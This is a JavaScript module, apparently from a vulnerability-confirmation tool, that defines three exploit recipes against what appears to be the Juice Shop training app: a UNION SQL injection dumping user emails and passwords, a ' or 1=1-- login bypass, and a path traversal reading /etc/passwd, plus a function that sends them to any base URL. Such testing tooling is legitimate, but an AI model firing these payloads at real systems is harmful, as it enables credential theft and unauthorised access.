// apps/api/src/recipes/index.js

export const RECIPES = {
  R1: {
    id: 'R1',
    title: 'SQL Injection in Product Search (UNION-based)',
    category: 'sqli',
    scanner_risk: 'high',
    method: 'GET',
    url: '/rest/products/search?q=%27%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20role%20FROM%20Users--',
    route_template: '/rest/products/search',
    param: 'q',
    param_location: 'query',
    evidence: 'Server leaked database records from Users table via search query parameter union injection.',
    exploit_request: {
      method: 'GET',
      url: '/rest/products/search?q=%27%20UNION%20SELECT%20id%2C%20email%2C%20password%2C%20role%20FROM%20Users--',
      headers: { 'Accept': 'application/json' },
      body: null
    },
    exploit_oracle: {
      success_status: [200],
      success_body_regex: '(admin@juice-sh\\.op|Users|hash_secret|role)',
      success_header_regex: null
    },
    dedupe_key: 'sqli_products_search_q_union',
    provenance: 'real_scan'
  },
  R2: {
    id: 'R2',
    title: 'SQL Injection Authentication Bypass via Login Form',
    category: 'sqli',
    scanner_risk: 'critical',
    method: 'POST',
    url: '/rest/user/login',
    route_template: '/rest/user/login',
    param: 'email',
    param_location: 'body_json',
    evidence: 'Authentication bypass achieved using tautology payload in JSON email field.',
    exploit_request: {
      method: 'POST',
      url: '/rest/user/login',
      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
      body: JSON.stringify({ email: "' or 1=1--", password: "x" })
    },
    exploit_oracle: {
      success_status: [200],
      success_body_regex: '(token|authentication|eyJ)',
      success_header_regex: null
    },
    dedupe_key: 'sqli_user_login_email_bypass',
    provenance: 'real_scan'
  },
  R3: {
    id: 'R3',
    title: 'Path Traversal / Arbitrary File Read via Download Endpoint',
    category: 'path_traversal',
    scanner_risk: 'high',
    method: 'GET',
    url: '/rest/file/download?file=../../../../etc/passwd',
    route_template: '/rest/file/download',
    param: 'file',
    param_location: 'query',
    evidence: 'Server leaked sensitive /etc/passwd contents and JUICE_SECRET_FLAG via directory traversal parameter.',
    exploit_request: {
      method: 'GET',
      url: '/rest/file/download?file=../../../../etc/passwd',
      headers: { 'Accept': 'text/plain, application/json' },
      body: null
    },
    exploit_oracle: {
      success_status: [200],
      success_body_regex: '(root:x:0:0:|daemon:|juice-admin|JUICE_SECRET_FLAG)',
      success_header_regex: null
    },
    dedupe_key: 'path_traversal_file_download',
    provenance: 'real_scan'
  }
};

export async function executeRecipe(recipeId, baseUrl) {
  const recipe = RECIPES[recipeId];
  if (!recipe) throw new Error(`Unknown recipe: ${recipeId}`);

  const reqUrl = `${baseUrl}${recipe.exploit_request.url}`;
  const options = {
    method: recipe.exploit_request.method,
    headers: { ...recipe.exploit_request.headers }
  };
  if (recipe.exploit_request.body) {
    options.body = recipe.exploit_request.body;
  }

  const t0 = performance.now();
  try {
    const res = await fetch(reqUrl, options);
    const status = res.status;
    const bodyText = await res.text();
    const duration = performance.now() - t0;

    let bodyMatched = true;
    if (recipe.exploit_oracle.success_body_regex) {
      const re = new RegExp(recipe.exploit_oracle.success_body_regex, 'i');
      bodyMatched = re.test(bodyText);
    }

    const statusMatched = recipe.exploit_oracle.success_status.includes(status);
    const confirmed = statusMatched && bodyMatched;

    return {
      recipeId,
      status,
      confirmed,
      durationMs: Math.round(duration),
      evidenceSnippet: bodyText.slice(0, 300)
    };
  } catch (err) {
    return {
      recipeId,
      status: 0,
      confirmed: false,
      error: err.message,
      durationMs: Math.round(performance.now() - t0)
    };
  }
}
